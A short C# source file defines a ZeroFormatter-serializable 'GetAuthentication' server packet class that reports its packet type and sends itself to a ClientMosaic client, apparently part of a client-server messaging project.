using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class GetAuthentication : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetAuthentication;
            }
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
